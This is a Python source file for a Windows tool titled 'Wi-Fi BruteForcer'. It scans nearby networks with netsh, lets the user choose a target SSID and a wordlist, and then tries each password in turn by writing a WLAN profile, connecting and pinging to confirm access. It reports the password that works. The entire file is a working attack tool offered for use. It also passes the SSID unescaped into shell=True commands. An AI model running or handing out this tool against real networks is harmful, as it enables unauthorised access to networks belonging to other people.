import subprocess
import json
import pyfiglet
import platform
import os
from time import sleep
from rich.console import Console
from rich.table import Table
from rich import print
from rich.progress import Progress

console = Console()

class WifiBruteForces:
    def __init__(self):
        self.pass_file = "./wordlists/default.txt"
        self.interface = "Wi-Fi"
        self.pass_folder_path = "./wordlists"
        self.wifi_networks = None
        self.target_id = None  # Initialize target_id to None

    def clearscr(self):
        try:
            osp = platform.system()
            if osp in ["Darwin", "Linux"]:
                os.system("clear")
            elif osp == "Windows":
                os.system("cls")
        except Exception as e:
            print(f"Failed to clear screen: {e}")

    def get_wifi_networks(self):
        try:
            disconnect_result = subprocess.run(
                ["netsh", "wlan", "disconnect", f"interface={self.interface}"],
                capture_output=True,
                text=True,
            )
            if disconnect_result.returncode != 0:
                self.wifi_networks = json.dumps(
                    {
                        "error": "Failed to disconnect from Wi-Fi",
                        "message": disconnect_result.stderr,
                    },
                    indent=4,
                )
                return self.wifi_networks

            sleep(5)
            result = subprocess.run(
                ["netsh", "wlan", "show", "network", f"interface={self.interface}"],
                capture_output=True,
                text=True,
            )
            if result.returncode == 0:
                lines = result.stdout.split("\n")
                networks = []
                current_network = {}
                network_id = 1
                for line in lines:
                    if line.startswith("SSID"):
                        if current_network:
                            current_network["ID"] = network_id
                            networks.append(current_network)
                            current_network = {}
                            network_id += 1
                        parts = line.split(":")
                        ssid = parts[1].strip()
                        current_network["SSID"] = ssid
                    elif line.strip().startswith("Network type"):
                        network_type = line.split(":")[1].strip()
                        current_network["Network type"] = network_type
                    elif line.strip().startswith("Authentication"):
                        authentication = line.split(":")[1].strip()
                        current_network["Authentication"] = authentication
                    elif line.strip().startswith("Encryption"):
                        encryption = line.split(":")[1].strip()
                        current_network["Encryption"] = encryption
                if current_network:
                    current_network["ID"] = network_id
                    networks.append(current_network)
                self.wifi_networks = json.dumps(networks, indent=4)
            else:
                self.wifi_networks = json.dumps(
                    {"error": "Failed to retrieve Wi-Fi networks", "message": result.stderr},
                    indent=4,
                )
        except Exception as e:
            print(f"Error getting Wi-Fi networks: {e}")
            self.wifi_networks = json.dumps({"error": "Failed to retrieve Wi-Fi networks", "message": str(e)}, indent=4)
        return self.wifi_networks

    def render_json_as_table(self):
        try:
            if not self.wifi_networks:
                print("[bold red]No Wi-Fi networks found or failed to retrieve them.[/]")
                return
            
            data = json.loads(self.wifi_networks)
            table = Table(show_header=True, header_style="bold magenta")
            if data and isinstance(data, list):
                for key in data[0].keys():
                    table.add_column(key, style="dim")
                for item in data:
                    table.add_row(*[str(item[key]) for key in item.keys()])
            console.print(table)
        except json.JSONDecodeError as e:
            print(f"[bold red]Failed to decode JSON: {str(e)}[/]")

    def selection_process(self):
        try:
            network_data = json.loads(self.wifi_networks)
            ID = int(input("Enter SSID ID: "))
            selected_network = next(
                (network for network in network_data if network["ID"] == ID),
                None
            )
            if selected_network:
                self.target_id = selected_network["SSID"]
            else:
                print("No network found with the given ID.")
        except ValueError:
            print("Please enter a valid ID.")
        except Exception as e:
            print(f"Error selecting network: {e}")

    def get_network_interfaces(self):
        try:
            result = subprocess.run(
                [
                    "netsh",
                    "interface",
                    "show", "interface"
                ], capture_output=True, text=True
            )
            if result.returncode == 0:
                lines = result.stdout.split("\n")[3:]
                interfaces = []
                for line in lines:
                    if line.strip():
                        parts = line.split(maxsplit=3)
                        interface = {
                            "Admin State": parts[0],
                            "State": parts[1],
                            "Type": parts[2],
                            "Interface Name": parts[3],
                        }
                        interfaces.append(interface)
                numbered_interfaces = [
                    {"ID": i + 1, **iface} for i, iface in enumerate(interfaces)
                ]
                self.interface_data = json.dumps(numbered_interfaces, indent=4)
                return json.dumps(numbered_interfaces, indent=4)
            else:
                return json.dumps(
                    {
                        "error": "Failed to run command",
                        "message": result.stderr
                    }, indent=4
                )
        except Exception as e:
            print(f"Error getting network interfaces: {e}")
            return json.dumps({"error": "Failed to retrieve network interfaces", "message": str(e)}, indent=4)

    def render_interfaces_table(self):
        try:
            interfaces = json.loads(self.interface_data)
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("ID", style="dim")
            table.add_column("Admin State")
            table.add_column("State")
            table.add_column("Type")
            table.add_column("Interface Name")
            for iface in interfaces:
                table.add_row(
                    str(iface["ID"]),
                    iface["Admin State"],
                    iface["State"],
                    iface["Type"],
                    iface["Interface Name"],
                )
            console.print(table)
        except json.JSONDecodeError as e:
            print(f"[bold red]Failed to decode JSON: {str(e)}[/]")
        except Exception as e:
            print(f"Error rendering interfaces table: {e}")

    def select_interface(self):
        try:
            interfaces = json.loads(self.interface_data)
            ID = int(input("Enter interface ID to select: "))
            selected_interface = next(
                (iface for iface in interfaces if iface["ID"] == ID), None
            )
            if selected_interface:
                self.interface = selected_interface["Interface Name"]
            else:
                print("Invalid interface ID.")
        except ValueError:
            print("Please enter a valid ID.")
        except Exception as e:
            print(f"Error selecting interface: {e}")

    def create_wifi_profile_xml(self, passphrase):
        try:
            networks = json.loads(self.wifi_networks)
            network_info = next(
                (item for item in networks if item["SSID"] == self.target_id),
                None
            )

            if not network_info:
                print(f"No network information found for SSID: {self.target_id}")
                return False

            # Convert SSID to hexadecimal representation
            ssid_hex = "".join("{:02X}".format(ord(c)) for c in self.target_id)

            xml_content = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{self.target_id}</name>
    <SSIDConfig>
        <SSID>
            <name>{self.target_id}</name>
            <hex>{ssid_hex}</hex>
        </SSID>
        <nonBroadcast>false</nonBroadcast>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <autoSwitch>false</autoSwitch>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{passphrase}</keyMaterial>
            </sharedKey>
            <keyIndex>0</keyIndex>
        </security>
    </MSM>
</WLANProfile>"""

            self.xml_path = f"./xml/{self.target_id}.xml"
            with open(self.xml_path, "w") as file:
                file.write(xml_content)

            return True
        except Exception as e:
            print(f"Error creating Wi-Fi profile XML: {e}")
            return False

    def connect_wifi_and_verify_with_interface(self):
        try:
            # Add the Wi-Fi profile
            add_profile_cmd = f'netsh wlan add profile filename="{self.xml_path}" interface="{self.interface}"'
            subprocess.run(add_profile_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Connect to the Wi-Fi network
            connect_cmd = f'netsh wlan connect name="{self.target_id}" interface="{self.interface}"'
            subprocess.run(connect_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Wait for the connection to establish
            sleep(10)  # Adjust the sleep time as needed

            # Verify internet connectivity
            ping_cmd = "ping www.google.com -n 1"
            ping_result = subprocess.run(ping_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if "Received = 1" in ping_result.stdout:
                print(f"Connected to {self.target_id} on interface {self.interface} with internet")
                return True
            else:
                print(f"Failed to connect to {self.target_id} on interface {self.interface}")
                return False
        except Exception as e:
            print(f"Error connecting to Wi-Fi network: {e}")
            return False

    def list_passfiles(self):
        try:
            files = [
                file
                for file in os.listdir(self.pass_folder_path)
                if os.path.isfile(os.path.join(self.pass_folder_path, file))
            ]
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Number", style="dim", width=12)
            table.add_column("File Name", min_width=20)
            files_dict = {}
            for index, file in enumerate(files, start=1):
                files_dict[str(index)] = file
                table.add_row(str(index), file)
            console.print(table)
            while True:
                selection = console.input(
                    "[bold green]Enter the number of the passfile you want to select (0 to use default): [/]"
                )
                if selection == "0":
                    self.pass_file = "./wordlists/default.txt"
                    break
                elif selection in files_dict:
                    self.pass_file = os.path.join(self.pass_folder_path, files_dict[selection])
                    break
                else:
                    console.print(
                        "[bold red]Invalid selection. Please enter a valid number.[/]"
                    )
        except Exception as e:
            print(f"Error listing pass files: {e}")


    def brute_force_wifi(self):
        try:
            with open(self.pass_file, "r") as file:
                passwords = file.read().splitlines()
        except FileNotFoundError:
            print("Password file not found.")
            return False

        print(f"Initiating brute force on: [bold yellow]{self.target_id}[/] with: [bold yellow]{len(passwords)}[/] passwords.")
        confirm = input("Proceed with brute-force attack? (y/n): ")
        if confirm.lower() != 'y':
            print("Brute-force attack aborted.")
            return False

        success = False
        try:
            with Progress() as progress:
                task = progress.add_task("Brute Forcing...", total=len(passwords))

                for passphrase in passwords:
                    self.create_wifi_profile_xml(passphrase.strip())  # Ensure no whitespace issues
                    if self.connect_wifi_and_verify_with_interface():
                        print(f"Success! Connected to {self.target_id} with password: {passphrase}")
                        success = True
                        break  # Exit loop on success

                    progress.update(task, advance=1)
                    sleep(1)  # Optional delay to avoid flooding the network

                if not success:
                    print(f"Brute force failed. Could not connect to {self.target_id}")

                return success

        except Exception as e:
            print(f"Error during brute force attack: {e}")
            return False


def main():
    try:
        os.system("color")
        wifi_brute_forcer = WifiBruteForces()
        title = pyfiglet.figlet_format("Wi-Fi BruteForcer", font="slant")
        print(f"[bold cyan]{title}[/]")
        wifi_brute_forcer.clearscr()
        interface_list = wifi_brute_forcer.get_network_interfaces()
        wifi_brute_forcer.render_interfaces_table()
        wifi_brute_forcer.select_interface()
        wifi_networks = wifi_brute_forcer.get_wifi_networks()
        wifi_brute_forcer.render_json_as_table()
        wifi_brute_forcer.selection_process()
        wifi_brute_forcer.list_passfiles()
        wifi_brute_forcer.brute_force_wifi()
    except Exception as e:
        print(f"Error in main function: {e}")


if __name__ == "__main__":
    main()
